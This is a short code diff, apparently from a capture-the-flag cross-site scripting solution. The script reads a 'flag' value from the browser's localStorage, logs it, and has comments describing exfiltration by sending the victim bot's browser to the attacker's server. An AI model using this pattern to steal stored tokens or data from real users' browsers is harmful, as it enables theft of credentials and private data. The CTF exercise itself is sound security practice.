@@ -2,6 +2,9 @@
 try {
   // Read the flag from local storage
   var flag = window.localStorage.getItem('flag');
+
+  // print flag
+  console.log('Flag:', flag);
   
   // Exfiltrate the flag by navigating the bot's browser
   // to your server. The flag will appear in your server's access logs.
